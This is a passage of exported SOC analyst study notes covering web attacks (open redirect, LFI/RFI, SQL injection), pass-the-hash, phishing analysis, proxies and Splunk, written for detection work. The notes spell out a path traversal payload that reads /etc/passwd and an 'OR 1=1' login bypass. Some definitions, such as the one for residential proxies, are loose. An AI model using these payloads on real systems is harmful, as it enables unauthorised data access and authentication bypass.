\n/^.”GET.?.=(https%3a%2f%2f[a-z0-9-]+%2e[a-z]{2,}).+?.HTTP/.“.$/gm\nThis regex will match any log entry where the HTTP method is GET, the request contains a query parameter with x.com, and the request is using HTTP version 1.0 or 1.1. This should match the most common open redirection attack patterns.\nYou can customize this regex to match specific query parameters or HTTP methods that are relevant to your web application. Remember that this regex is just one part of an overall security monitoring strategy and should be used in conjunction with other security tools and best practices.\nDetection Example\nExample nginx access log file;\n\nAs you can see it on the above screenshot, open redirection attacks were made to the victim.com website on 18/Apr/2023:20:05:05. We have mentioned that attention should be to encoded characters. Here is where the importance of this issue is seen.\nEncoded:\n\nDecoded:\n\nWhen we decode the request, we see that the attacker wants to redirect to google.com with the ?pro parameter. When we realize that all requests occur within seconds, we understand that this is done with the help of a tool. At the same time, the source IPs are all the same."},"SOC/SOC-Analyst-Notes/Pass-the-Hash-Attack":{"slug":"SOC/SOC-Analyst-Notes/Pass-the-Hash-Attack","filePath":"SOC/SOC Analyst Notes/Pass the Hash Attack.md","title":"Pass the Hash Attack","links":["SOC/SOC-Analyst-Notes/Hash","HTB/Active-Directory"],"tags":[],"content":"A Pass-the-Hash (PtH) attack is a technique where an attacker captures a password Hash (as opposed to the password characters) and then passes it through for authentication and lateral access to other networked systems. With this technique, the threat actor doesn’t need to decrypt the Hash to obtain a plain text password. PtH attacks exploit the authentication protocol, as the passwords Hash remains static for every session until the password is rotated. Attackers commonly obtain hashes by scraping a system’s active memory and other techniques.\nWhile Pass-the-Hash attacks can occur on Linux, Unix, and other platforms, they are most prevalent on Windows systems. In Windows, PtH exploits Single Sign-On (SS0) through NT Lan Manager (NTLM), Kerberos, and other authentication protocols. When a password is created in Windows, it is hashed and stored in the Security Accounts Manager (SAM), Local Security Authority Subsystem (LSASS) process memory, the Credential Manager (CredMan) store, a ntds.dit database in Active Directory, or elsewhere. When a user logs onto a Windows workstation or server, they essentially leave behind their password credentials."},"SOC/SOC-Analyst-Notes/Phishing":{"slug":"SOC/SOC-Analyst-Notes/Phishing","filePath":"SOC/SOC Analyst Notes/Phishing.md","title":"Phishing","links":["IP-address","SOC/SOC-Analyst-Notes/Email-Header-Analysis","SOC/SOC-Analyst-Notes/Email-Header","SOC/SOC-Analyst-Notes/Static-Email-Analysis","Malware-Analysis/Dynamic-Email-Analysis","gateway","SOC/SOC-Analyst-Notes/Web-Attacks"],"tags":[],"content":"Phishing is a form of social engineering and a scam where attackers deceive people into revealing sensitive information or installing malware such as viruses, worms, adware, or ransomware.\nInformation Gathering\nSpoofing\nBecause emails do not necessarily have an authentication mechanism, attackers can send emails in the name of someone else. Attackers can do this by using a technique called spoofing to make the user believe that the incoming email is reliable. Several protocols have been created to prevent the email spoofing technique. The SPF, DKIM, and DMARC protocols can be used to determine whether the sender’s address is fake or real. Some email programs check emails automatically. However, the use of these protocols is not mandatory and can cause problems in some cases.\n\nSender Policy Framework (SPF)\nDomainKeys Identified Mail (DKIM)\n\nTo manually determine if a mail is spoofed or not, the SMTP address of the mail should first be identified. The domain’s SPF, DKIM, DMARC, and MX records can be obtained using tools such as Mxtoolbox. Comparing this information will tell you if the email is spoofed or not.\n\nAs large institutions using their own mail servers will have their own IP addresses, you can check whether the SMTP address belongs to that institution or not by looking at the Whois records of the SMTP IP address.\nPhishing Email Analysis\n1. Email Header Analysis\nEmail Header can give us various insight on email origin and server details.\n2. Static Email Analysis\n3. Dynamic Email Analysis\n3. E-mail Traffic Analysis\nMany parameters are needed to analyze a phishing attack. The following parameters can give us an idea of the size of the attack and the target audience if we perform a search on the mail gateway.\n\nSender Address(info@letsdefend.io)\nSMTP IP Address(127.0.0.1)\n@letsdefend.io (domain base)\nletsdefend (In addition to the Gmail account, the attacker may have sent from the Hotmail account)\nSubject (sender address and SMTP address may be constantly changing)\n\nIn addition to the email numbers, it is necessary to know the recipients’ addresses and time information in the search results. If malicious emails are constantly being forwarded to the same users, their email addresses may have somehow been leaked and shared on sites such as PasteBin.\nAttackers can find email addresses using [[Reconnaissance#1. [theHarvester](https //github.com/laramies/theHarvester)|theHarvester]] tool on Kali Linux.\nNext: Web Attacks"},"SOC/SOC-Analyst-Notes/Proxy-Server":{"slug":"SOC/SOC-Analyst-Notes/Proxy-Server","filePath":"SOC/SOC Analyst Notes/Proxy Server.md","title":"Proxy Server","links":[],"tags":[],"content":"What is Proxy Server?\nA proxy Server is hardware or software used for many different purposes and acts as a gateway between client and server.\nTypes of Proxy Servers\nThere are many types of Proxy Servers:\n\n1. Forward Proxy Server\nForward Proxy Server is the most widely used proxy server type. It is used to direct requests from a private network to the internet with a firewall.\n2. Transparent Proxy Server\nA transparent Proxy Server is a proxy server that directs requests and responses to the target without making changes to incoming/outgoing requests and responses.\n3. Anonymous Proxy Server\nAnonymous Proxy Server is a proxy server that enables anonymous browsing on the internet.\n4. High Anonymity Proxy Server\nA high Anonymity Proxy Server is a proxy server that makes it difficult to track the client with higher confidentiality without sending the proxy server type and client IP address information in the request.\n5. Distorting Proxy Server\nA distorting Proxy Server is a proxy server that tries to hide its identity by defining itself as the proxy server of a website. By changing the real IP address, the confidentiality of the client is tried to be ensured.\n6. Data Center Proxy Server\nData Center Proxy Server is a special proxy server that is used as a proxy server that is not connected to the ISP (Internet Service Provider) by getting service over data centers. It is a proxy server that is insufficient to provide anonymity. It has a quick response feature.\n7. Residential Proxy Server\nA residential Proxy Server is a proxy server that passes all requests made by the client. Thanks to this proxy server, unwanted and suspicious advertisements can be blocked. It is more secure than other proxy servers.\n8. Public Proxy Server\nA public Proxy Server is a free proxy server available to everyone. It is ideal for those looking for a cost-free proxy server by sacrificing security and speed. It’s insecure because it’s accessible to everyone, and it’s also slow.\n10. Shared Proxy Server\nA shared Proxy Server is a proxy server that can be used by more than one person at the same time. It is preferred for fast connection and cost-free use. The disadvantage of this proxy server is that it is used by many people at the same time, so the activity of any user can affect another. For example, after the activity of one of the users, the IP address of this proxy server may be blocked by a server. In this case, access to the blocking server cannot be provided by all persons using the proxy server.\n11. SSL Proxy Server\nSSL Proxy Server is a proxy server in which the communication between client and server is provided in a bidirectional encrypted manner. It can be said to be safe because it provides encrypted communication against threats.\n12. Rotating Proxy Server\nA rotating Proxy Server is a proxy server where a separate IP address is assigned to each client.\n13. Reverse Proxy Server\nA reverse Proxy Server is a proxy server that validates and processes transactions so that the client does not communicate directly. The most popular reverse proxy servers are “Varnish” and “Squid”.\n14. Split Proxy Server\nA split Proxy Server is a proxy server that runs as two programs installed on two different computers.\n15. Non-Transparent Proxy Server\nA non-Transparent Proxy Server is a proxy server that works by sending all requests to the firewall. Clients using this proxy server are aware that requests are sent over the firewall.\n16. Hostile Proxy Server\nA hostile Proxy Server is a proxy server used to eavesdrop on traffic between client and target on the web.\n17. Intercepting Proxy Server\nIntercepting Proxy Server is a proxy server that allows using proxy server features and gateway features together.\n18. Forced Proxy Server\nA forced Proxy Server is a proxy server where blocking and allowing policies are applied together.\n19. Caching Proxy Server\nCaching Proxy Server is a proxy server that has a caching mechanism on it and returns a response in accordance with this caching mechanism in response to the requests sent by the clients.\n20. Web Proxy Server\nA web Proxy Server is a proxy server that works on web traffic.\n21. Socks Proxy Server\nA socks Proxy Server is a proxy server that prevents external network components from obtaining information about the client.\n22. HTTP Proxy Server\nHTTP Proxy Server is a proxy server with caching mechanism for HTTP protocol.\nBenefits of Proxy Server\n\n\nPrivate browsing\n\n\nIncreases user security.\n\n\nAllows the client’s IP address to be hidden.\n\n\nIt allows to manage network traffic.\n\n\nTogether with the caching mechanism, it saves bandwidth.\n\n\nIt can provide access to places with access restrictions.\n\n\nHow Does a Proxy Work?\nSince the proxy server is a network component that is responsible for forwarding the requests from the client to the target address, it functions by taking place between the two communicating parties. Basically, how the proxy server works is shown below.\n\nAs seen in the image above, the requests sent by the client must pass through the proxy server before going to the destination. In this way, it is ensured that all requests sent by the client pass through the proxy server, which is an intermediary network component. Proxy server directs incoming requests to the target in accordance with its intended use.\nThe proxy server keeps some log records of its transactions. If necessary, some details about network communication can be seen by looking at these log records. The log activity on the proxy server is roughly as follows:\n\nThe Importance of Proxy Servers for Security\nProxy Server can take on important tasks at some points, although it varies according to the purpose of use. For example, since the IP address field in the request sent by the client is changed with the IP address belonging to the proxy server on the proxy server, the IP address of the proxy server appears in the destination instead of the IP address of the client. In this case, the IP address of the client is hidden and security is provided.\nAs SOC Analysts, we need to pay attention to the traffic coming from the Proxy while analyzing the servers. Because the source IP address we see does not belong directly to the person concerned, it belongs to the proxy server. What we need to do is to find the real source IP making the request to the proxy server and continue the analysis with these findings.\nAnother issue is that only some types of proxy servers support encrypted traffic. In terms of security, it is very important to transmit the traffic as encrypted. It can be said that proxy servers with this feature are more secure.\nSome popular Proxy Server products used in the cyber security industry are as follows:\n\nSmartproxy\nBright Data\nSOAX\nOxylabs\n"},"SOC/SOC-Analyst-Notes/Punycode":{"slug":"SOC/SOC-Analyst-Notes/Punycode","filePath":"SOC/SOC Analyst Notes/Punycode.md","title":"Punycode","links":[],"tags":[],"content":"What is Punycode?\nAs per Wandera, “Punycode is a way of converting words that cannot be written in ASCII, into a Unicode ASCII encoding.”\nA Punycode attack used by the attackers to redirect users to a malicious domain that seems legitimate at first glance.\nFor example, adıdas.de is a domain name which has the Punycode of xn--addas-o4a.de/ which at first glance looks like a legitimate website.\nInternet Explorer, Google Chrome, Microsoft Edge, and Apple Safari are now pretty good at translating the obfuscated characters into the full Punycode domain name."},"SOC/SOC-Analyst-Notes/Pyramid-of-Pain":{"slug":"SOC/SOC-Analyst-Notes/Pyramid-of-Pain","filePath":"SOC/SOC Analyst Notes/Pyramid of Pain.md","title":"Pyramid of Pain","links":["SOC/SOC-Analyst-Notes/Hash","Networking/IPV4-Address","Networking/IP-Address","SOC/SOC-Analyst-Notes/Firewall","SOC/SOC-Analyst-Notes/Fast-Flux","Networking/DNS","SOC/SOC-Analyst-Notes/Punycode","SOC/SOC-Analyst-Notes/C2","Networking/URI,-URN-and-URL","SOC/SOC-Analyst-Notes/Wireshark","SOC/SOC-Analyst-Notes/Phishing","SOC/SOC-Analyst-Notes/Backdoor","SOC/SOC-Analyst-Notes/fuzzy-hashing","SOC/SOC-Analyst-Notes/Pyramid-of-Pain","SOC/SOC-Analyst-Notes/Pass-the-Hash-Attack","SOC/SOC-Analyst-Notes/Cyber-Kill-Chain"],"tags":[],"content":"Pyramid of Pain is a conceptual model which organizes IOCs(Indicators Of Compromise) with the level of difficulty it will cause for an adversary to change the indicators associated with them, and their campaign.\nThe Pyramid of Pain\n1. Hash Values : Trivial\nHash values give insight into a specific malware sample, a malicious or a suspicious file, and as a way to uniquely identify and reference the malicious artifact. Various online tools such as VirusTotal and Metadefender Cloud - OPSWAT. can be used to perform hash lookups.\nBut modifying a file with even a single bit results in a different hash which can make it difficult to identify a malicious file using hash lookups.\n2. IP Address: Easy\nKnowing an IP Address of attacker can be beneficial since we can just put up a Firewall rule to block the attacker. But this is not very effective as it can be easily evaded using tools like Fast Flux\n3. Domain Names: Simple\nDomain Names can be a pain for attacker as they would be needed to purchase, register and modify DNS Records. But attackers can use Punycode and redirection services to trick victim into visiting malicious sites.\nFun Trick: A + symbol when appended after a shortened link can enable us to see where a link is set up to redirect.\ne.g. When we visit tinyurl.com/xasdepobu+, we see:\n\n4. Host Artifacts: Annoying\nHost artifacts are the traces or observables that attackers leave on the system, such as registry values, suspicious process execution, attack patterns or IOCs (Indicators of Compromise), files dropped by malicious applications, or anything exclusive to the current threat.\nDetection of host artifacts is annoying because the attacker will have to circle back and change his attacking tools and methodologies.\n5. Network Artifacts: Annoying\nA network artifact can be a user-agent string, C2 information, or URI patterns followed by the HTTP POST requests. An attacker might use a User-Agent string that hasn’t been observed in your environment before or seems out of the ordinary.\nNetwork artifacts can be detected in Wireshark PCAPs (file that contains the packet data of a network) by using a network protocol analyzer such as TShark or exploring IDS (Intrusion Detection System) logging from a source such as Snort.\ne.g., We can use TShark to filter out the User-Agent strings by using the following command: tshark --Y http.request -T fields -e http.host -e http.user_agent -r analysis_file.pcap\n6. Tools: Challenging\nAt this stage, attacker will have to create new tools which means investing more time and money that is also if the adversary is actually capable of developing new malware.\nAttacker often use spear Phishing using malicious macro documents (maldocs) and attempt to create a Backdoor that can be used to establish C2, any custom .EXE, and .DLL files, payloads, or password crackers.\nWe can use fuzzy hashing to detect any malicious file with trivial changes made with intention of bypassing Hash value detection.\n7. TTPs: Tough\nThis is the pinnacle of Pyramid of Pain.\nTTPs stands for Tactics, Techniques &amp; Procedures. This includes the whole MITRE ATT&amp;CK Matrix, which means all the steps taken by an adversary to achieve his goal, starting from Phishing attempts to persistence and data exfiltration.\nIf we can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back.\nIf you can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back. For, example if you could detect a Pass the Hash Attack using Windows Event Log Monitoring and remediate it, you would be able to find the compromised host very quickly and stop the lateral movement inside your network.\n\nNext: Cyber Kill Chain"},"SOC/SOC-Analyst-Notes/RFI--and--LFI":{"slug":"SOC/SOC-Analyst-Notes/RFI--and--LFI","filePath":"SOC/SOC Analyst Notes/RFI & LFI.md","title":"RFI & LFI","links":[],"tags":[],"content":"What is Local File Inclusion (LFI)?\nLocal File Inclusion (LFI), is the security vulnerability that occurs when a file is included without sanitizing the data obtained from a user. It differs from RFI because the file that is intended to be included is on the same web server that the web application is hosted on.\nWhat is Remote File Inclusion (RFI)?\nRemote File Inclusion (RFI) is a vulnerability that occurs when a file is included without sanitizing the data received from a user. It differs from LFI because the included file is hosted on another server.\nHow does LFI &amp; RFI work?\nLike most web application-based vulnerabilities, LFI and RFI have vulnerabilities caused by the failure to sanitize data received from a user.\nRFI and LFI vulnerabilities arise when data received from a user is used directly in the system or to include a file on a remote server.\nHow could data received from a user be exploited to include a file? Web applications have become very complex over time and unfortunately, any feature that is developed can be used for malicious purposes. For example, the language setting in web applications is used to include files based on data received from a user.\n\nIf we examine the piece of code in the image above, we can see that the desired website language is selected using the ‘language’ parameter received from the user.\nIn a normal situation, the web application will work as intended. For example, if “en” is entered as the “language” parameter, we will receive the file shown below.\n“website/en/home.php”\nHowever, if an attacker enters the payload below in the “language” parameter, the web application will unfortunately display the “/etc/passwd” file to the user.\nPayload: /../../../../../../../../../etc/passwd%00\n“website//../../../../../../../../../etc/passwd%00/home.php\n“../” is used to go to the parent directory. Since the attacker does not know what directory the web application is in, he tries to use “../” to access the “root” directory. Later he names the file “/etc/passwd” and allows it to be included in the web application. The end of the string will be “%0”. This way, the rest of the “/home.php” string will not be read by the web application.\nHow Attackers Use RFI &amp; LFI?\n\nExecuting code\nDisclosure of sensitive information\nDenial of Service\n\nHow to Prevent LFI &amp; RFI?\nThe most effective way to prevent RFI and LFI attacks is to make sure that all data received from a user is sanitized before it is used. Remember that client-based controls are easily bypassed. Therefore, you should always implement your controls on both the client and server sides.\nDetecting LFI &amp; RFI Attacks\nWe have already mentioned what attackers can achieve with RFI and LFI attacks. Since an organization can lose a lot of money if these vulnerabilities are exploited, we should be able to detect these attacks and take the necessary precautions.\nHow can we detect and prevent LFI and RFI attacks?\n\nWhen examining a web request from a user, examine all fields.\nLook for any special characters: Within the data received from users, look for notations such as ’/’, ., \\.\nBecome familiar with files commonly used in LFI attacks: In an LFI attack, the attacker reads the files on the server. Knowing the critical file names on the server will help you detect LFI attacks.\nLook for acronyms such as HTTP and HTTPS: In RFI attacks, the attacker injects the file into their own device and allows the file to run.\nTo host a file, attackers usually set up a small web server on their own device and display the file using an HTTP protocol. You should therefore look for notations such as ‘http’ and ‘https’ to help you detect RFI attacks.\n"},"SOC/SOC-Analyst-Notes/Reconnaissance":{"slug":"SOC/SOC-Analyst-Notes/Reconnaissance","filePath":"SOC/SOC Analyst Notes/Reconnaissance.md","title":"Reconnaissance","links":["SOC/SOC-Analyst-Notes/OSINT","SOC/SOC-Analyst-Notes/Email-Harvesting","SOC/SOC-Analyst-Notes/Phishing"],"tags":[],"content":"Reconnaissance (MITRE Tactic TA0043) is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries.\nOSINT also falls underReconnaissance. The attacker needs to gather as much info on the victim as he can to determine the best path &amp; target for attack.\nAn attacker may use technique such as Email Harvesting to gather emails which he can later use for spearPhishing attacks.\nThe Arsenal\nSome commonly used tools for Reconnaissance:\n1. theHarvester \nother than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources \n2. Hunter.io\nthis is  an email hunting tool that will let you obtain contact information associated with the domain\n3. OSINT Framework\nOSINT Framework provides the collection of OSINT tools based on various categories"},"SOC/SOC-Analyst-Notes/SIEM":{"slug":"SOC/SOC-Analyst-Notes/SIEM","filePath":"SOC/SOC Analyst Notes/SIEM.md","title":"SIEM","links":[],"tags":[],"content":"What is SIEM?\nSIEM is a security solution that combines security information and event management, which involves real-time logging of events in an environment. The ultimate purpose of event logging is to detect security threats.\nOverall, SIEM products have a lot of features. They collect and filter data and provide alerts for suspicious events.\nExample alert: If someone on a Windows operating system tries to enter 20 incorrect passwords in 10 seconds, this is suspicious activity. It is unlikely that someone who has forgotten their password would try to re-enter it that many times in such a short period of time. So we create a SIEM rule/filter to detect such activity that exceeds the threshold. Based on this SIEM rule, an alert will be generated when such a situation occurs.\n\nSome popular SIEM solutions: IBM QRadar, ArcSight ESM, FortiSIEM, Splunk, etc."},"SOC/SOC-Analyst-Notes/SOAR":{"slug":"SOC/SOC-Analyst-Notes/SOAR","filePath":"SOC/SOC Analyst Notes/SOAR.md","title":"SOAR","links":["SOC/SOC-Analyst-Notes/SIEM","IP-address","SOC/SOC-Analyst-Notes/Hash"],"tags":[],"content":"SOAR (Security Orchestration Automation and Response)\nSOAR stands for Security Orchestration Automation and Response. It enables security products and tools in an environment to work together, streamlining the tasks of SOC team members. For example, it will automatically search VirusTotal for the source IP of a SIEM alert, reducing the workload of the SOC analyst.\nSome SOAR products commonly used in the industry:\n\n\nSplunk Phantom\n\n\nIBM Resilient\n\n\nLogsign\n\n\nDemisto\n\n\nThe image below shows what can be achieved with a SOAR solution.\n\nBenifits of SOAR\nSaves Time\nSOAR saves time with workflows that automate processes. Some common workflows are:\n\nIP address reputation control\nHash query\nScanning an acquired file in a sandbox environment\n…\n\nCentralization (A single platform for everything you need)\nIt allows us to use different security tools in your environment (sandbox, log management, 3rd party tools, etc.) by providing an all-in-one software. These tools are integrated into the SOAR solution and can be used on the same platform.\n\nPlaybooks\nWe can easily investigate SIEM alerts using playbooks created for different scenarios within SOAR. Even if we don’t know or remember all the procedures, we can perform an analysis by following the steps outlined in the playbooks\nIn addition, these playbooks help ensure that the entire SOC team is on the same page when performing their analysis. For example, all team members need to check IP reputation, so if one team member is not checking it and the others are, this is an undesirable situation. We can avoid this situation by adding this step to the playbook."},"SOC/SOC-Analyst-Notes/SQL-Injection":{"slug":"SOC/SOC-Analyst-Notes/SQL-Injection","filePath":"SOC/SOC Analyst Notes/SQL Injection.md","title":"SQL Injection","links":[],"tags":[],"content":"What is SQL Injection (SQLi)?\nSQL Injections are critical attack vectors in which a web application directly includes un-sanitized user-provided data in SQL queries.\n\nThe frameworks we use today to develop web applications have preventative mechanisms in place to protect against SQL Injection attacks. However, we still come across SQL injection vulnerabilities because sometimes raw SQL queries are used, sometimes the framework has an inherent SQL injection vulnerability, or the framework is not used properly.\nTypes of SQL Injections\nThere are 3 types of SQL Injection. These are: \n1. In-band SQLi (Classic SQLi)\nWhen an SQL query is sent and responded to on the same channel, we call this in-band SQLi. This is easier for attackers to exploit than other categories of SQLi.\n2. Inferential SQLi (Blind SQLi)\nSQL queries that receive a response that cannot be seen are called Inferential SQLi. They are also called “Blind SQLi” because the response cannot be seen.\n3. Out-of-band SQLi\nIf the response to an SQL query is communicated through another channel, this type of SQLi is called “out-of-band SQLi”. For example, if the attacker receives replies to the SQL queries via DNS, this is called out-of-band SQLi.\nHow Does SQL Injection Work?\nToday, most standard web applications receive data from a user and use that data to display specific content. The login page is where most SQL injection attacks occur. Let’s look at how SQL injections work through an example.\nA user is usually expected to enter their username and password on the login page. Then, on the other side, the web application will use this username and password information to create an SQL query like the one below:\n\nSELECT * FROM users WHERE username = ‘USERNAME’ AND password = ‘USER_PASSWORD’\n\nThe meaning of this SQL query is “Bring me all the information about the user from the user’s table whose name is USERNAME and whose password is USER_PASSWORD”. If the web application finds a matching user, it will authenticate the user, if it cannot find a user after executing the query, the login will fail.\n\nLet’s say your username is “john” and your password is “supersecretpassword”. When you enter this information and click the ‘Login’ button, the SQL query shown below will be queried and you will be able to log in because a match was found after the SQL query.\n\nSELECT * FROM users WHERE username = ‘john’ AND password = ‘supersecretpassword’\n\nSo what if we do not use this system as it was designed and we put an apostrophe (’) in the username field? The SQL query will look like this and the error will be excluded from the database because the query was incorrect.\n\nSELECT * FROM users WHERE username = ‘john’’ AND password = ‘supersecretpassword’\n\n\nOf course, an attacker would be pleased to get an error message, as they can manipulate the information in the error message to their advantage. It also shows that the attacker is on the right track. So what if the attacker enters a payload like the following in the username section?\n\n‘ OR 1=1 — -\n\nWhen the attacker submits the payload, the web application executes the following SQL query:\n\nSELECT * FROM users WHERE username = ‘’ OR 1=1 — - AND password = ‘supersecretpassword’\n\nIn SQL, any characters after ”— -” are considered to be a comment line. So if we look at the query above, the characters after ”— -” mean nothing. So, for the sake of simplicity, let’s remove that part before we examine the SQL query further.\n\nSELECT * FROM users WHERE username = ‘’ OR 1=1\n\nThe query above now looks like this “if the username is empty or 1=1”. It does not matter whether the username field is empty or not, because 1 is always equal to 1. So this query will always be true and will most likely call the first entry in the database. The attacker will be able to successfully enter the web application because there is a match.\nThis is a typical SQL injection attack. Of course, SQL injection attacks are not limited to this example, the attacker could use SQL to execute commands in the system using SQL commands such as xp_cmdshell.\nWhat Attackers Gain from SQL Injection Attacks\nTo understand why SQL injection attacks are so important, let’s take a look at what an SQL injection attack can do.\n\nAuthentication bypass\nCommand execution\nExfiltration of sensitive data\nCreating/Deleting/Updating database entries\n\nHow to Prevent SQL Injections\n\nUse a framework: Of course, just using a framework is not enough to prevent a SQL injection attack. However, it is still very important to use the framework according to the documentation.\nKeep your framework up to date: Keep your web application secure by following security updates according to the framework you use.\nAlways sanitize data received from a user: Never trust data received from a user. In addition, sanitize all data (such as headers, URLs, etc.), not just form data.\nAvoid the use of raw SQL queries: You may be in the habit of writing raw SQL queries, but you should take advantage of the security provided by the framework.\n\nDetecting SQL Injection Attacks\nSo how do we detect SQL injection attacks?\nThere is more than one answer to this question:\n\nWhen examining a web request, check all areas that come from the user: As SQL injection attacks are not limited to the form areas, you should also check the HTTP request headers such as the “User-Agent”.\nLook for SQL keywords: Look for words such as “INSERT”, “SELECT”, and “WHERE” in the data received from users.\nCheck any special characters: Look for apostrophes (’), dashes (-), or parentheses used in SQL or special characters commonly used in SQL attacks in the data received from the user.\nFamiliarize yourself with commonly used SQL injection payloads: Although SQL payloads change depending on the web application, attackers still use some common payloads to test for SQL injection vulnerabilities. If you are familiar with these payloads, you can easily detect SQL injection payloads. You can find some commonly used SQL injection payloads here.\n\nDetecting Automated SQL Injection Tools\nAttackers use many automated tools to detect SQL injection vulnerabilities. One of the well-known tools is Sqlmap. However, let’s look at the bigger picture rather than focusing on one particular tool.\nYou can use the following methods to detect SQL injection tools:\n\n\nLook at the User-Agent: Automated tools usually have their names and versions recorded. You can look at the User-Agent to detect these automated tools.\n\n\nCheck the frequency of requests: Automated tools are designed to send an estimated number of requests per second to test payloads as quickly as possible. A normal user might send 1 request per second, so looking at the number of requests per second will tell you if the requests are from an automated tool or not.\n\n\nLook at the content of the payload: Automated tools usually include their own names in their payloads. For example, an SQL injection payload sent by an automated tool might look like this: sqlmap’ OR 1=1\n\n\nIf the payload is complicated: This detection method may not always work, but based on my experience I could say that automated tools send more complicated payloads.\n\n\nA Detection Example\nWe have access logs of a web application that was the victim of a SQL injection attack.\nYou may not know what an access log is. In a nutshell, they are the access logs from the web server. These logs usually contain the source IP address, date, requested URL, HTTP method, user agent, and HTTP response code, and they are very useful for investigations.\n\n(SQL Injection Access Logs)\nWe have an access log in hand. What do we do now?\nFirst of all, if we look at the pages that were requested, we see that besides pages like “info.php”, which is quite readable, there are also requests for pages that are complex and contain symbols like %. We cannot say that requests for pages like this are malicious, but the fact that they are repeated many times is suspicious.\nNext, let’s talk about what the % symbols mean. When we request a page that contains special characters, these requests are not sent directly to the web server. Instead, our browsers perform a URL encoding (“Percent Encoding”) of the special characters and replace each special character with a string that starts with % and contains 2 hexadecimal characters. So the pages that contain the % symbol above are pages that contain special characters.\n\nNow that we understand what the % symbols mean, let’s revisit the access logs. If we look at the requests, we can easily see that there are readable words such as “UNION”, “SELECT”, “AND”, and “CHR” next to the % symbols. As these are specific words belonging to SQL, we can see that we are facing an SQL injection attack.\nTo protect our eyes, let’s make the investigation a bit easier :) You can search with the keywords ” Online URL Decoder” to find web applications that automatically decode URLs for you. To make it easier to read these access logs, we’ll get help from these web applications, so we don’t have to strain our eyes.\nPlease note this: It is not wise to upload something like access logs, which contain critical information, to a 3rd party web application. The access logs uploaded in this course have been prepared specifically for educational purposes; don’t make such a mistake in your professional life.\n\nWhen we decode the URL, we can see more clearly that this is a SQL injection attack. So what do we do now?\nWe are going to find any other information we can from these access logs.\n\nFirst, let’s look at the request times. All the SQL injection payloads were sent on “19/Feb/2022 11:09:24”. We can see that more than 50 requests were made in 1 second. The fact that so many requests were made in such a short period indicates that this is an automated attack. In addition, as we mentioned earlier when attackers do manual testing, they choose to test simple payloads first. But when we look at the access logs, we see that the payloads are very complicated. This shows that the attack could be automated.\nWas is successful?\nWe have confirmed that an SQL injection attack was performed and that it was performed with an automated tool. So we can finish our analysis, right?\nThere is one more step to take. We need to determine whether or not the attack was successful. You can determine whether a SQL injection attack has been successful by looking at the response, but in real life, you will almost never have access to the response. We can assume that all responses will be about the same size because the attack is on the same page and via the “id” variable, and estimate the success of the attack by looking at the size of the response.\nUnfortunately, the simple web server developed as an example cannot provide a reliable response size. Therefore, we cannot estimate whether the attack was successful by looking at this example. However, for correctly configured web servers, we can find the response size in the access logs. You can examine this area to see if there is a noticeable difference in response sizes. If there is a noticeable difference, then you can assume that the attack was successful. However, in this situation, it would be best to escalate this alert to a senior analyst."},"SOC/SOC-Analyst-Notes/Sandbox-Solutions":{"slug":"SOC/SOC-Analyst-Notes/Sandbox-Solutions","filePath":"SOC/SOC Analyst Notes/Sandbox Solutions.md","title":"Sandbox Solutions","links":[],"tags":[],"content":"What is Sandbox Solutions?\nSandbox is a technology used to run/open and examine executable files or file types with different extensions (pdf, docx, and xlsx, etc.) that are thought or known to be malware in an isolated environment. Thanks to the Sandbox, precautions are taken against the problems that may arise when the file is run/opened on a live system.\nThe Benefits of Sandboxing\n\nIt does not put hosts and operating systems at risk.\nDetects potentially dangerous files.\nAllows testing of software updates before they go live.\nIt allows fighting against 0-day vulnerabilities.\n\nThe Importance of Sandboxes for Security\nMalware types encountered in the past are now trying to access systems with more different and advanced methods by designing themselves in a better way. Therefore, technologies that provide security against advanced attack tools and malware are also created. Sandboxes should be used to see malware behaviors and take precautions accordingly. Here’s how a sandbox works:\n\nSome popular Sandbox products used in the cyber security industry are as follows:\n\nCheckpoint\nMcAfee\nSymantec\nTrend Micro\nProofpoint\n\nWhat data sources do sandboxes have?\nEach sandbox product holds its unique data. However, it can be said that the information that sandboxes can keep in the data presented to the user due to their duty is about the analysis they make. For example, when the sample.exe file is run in the sandbox environment, information such as the run time of this file, the files the program accesses after running, its behavior, the date/time information of these operations, and the hash information of this file may be included in the data provided to the user by the sandbox product."},"SOC/SOC-Analyst-Notes/Searching-Data-in-Splunk":{"slug":"SOC/SOC-Analyst-Notes/Searching-Data-in-Splunk","filePath":"SOC/SOC Analyst Notes/Searching Data in Splunk.md","title":"Searching Data in Splunk","links":[],"tags":[],"content":"Search on Splunk\nLet’s take a tour on the Search page. As you see, there is a lot of information to learn, let’s try to clarify them.\n\nTraps and Tips\n\n\nField names are case sensitive\n\n\nField values are not case sensitive\n\n\nThe wildcard is available (use *)\n\n\nYou can use operators such as AND, OR, NOT\n\n\nDate Selection\nThe first thing to do is to select the data range.\n\nFrom here you can choose:\n\n\nPresets (today, last week, last year, last 24 hours, etc.)\n\n\n\n\n\nRelative (beginning of the hour, X minutes ago, X weeks ago, etc.)\n\n\n\n\n\nReal-time\n\n\nDate range (between 00:00 DD/MM/YYYY and 24:00 DD/MM/YYYY)\n\n\n\n\n\nDate &amp; time range (same but you can choose an hour)\n\n\nTimeline\nWhen you perform a search, Splunk displays a Timeline\n\nSearch Mode\nThere are three modes, you will use mostly the Smart Mode.\n\n\nSearch Bar\n\nThis is where you make your request. As we said previously, you can use the wildcard character (”*”) and operators. You can mix it all!\n\n\nSearch for a username with “Je” on it. Try “Username=Je*” You will find username like Jeanne, Jean, etc.\n\n\nSearch for connection on the computer named computer1. Try “eventid=4624 AND computername=computer1”\n\n\nSearch for every connection on the computer except the domain controller. Try “eventid=4624 NOT computername=domaincontroller”\n\n\nRemember to use “Search History”\n\n\nFields\nFields are available on the left. Here you have each field available in your search.\n\nSelect the field to have information about it.\n\nSave As\nIn this menu, you can choose to save your request as a report, alert, or dashboard."},"SOC/SOC-Analyst-Notes/Security-Solutions":{"slug":"SOC/SOC-Analyst-Notes/Security-Solutions","filePath":"SOC/SOC Analyst Notes/Security Solutions.md","title":"Security 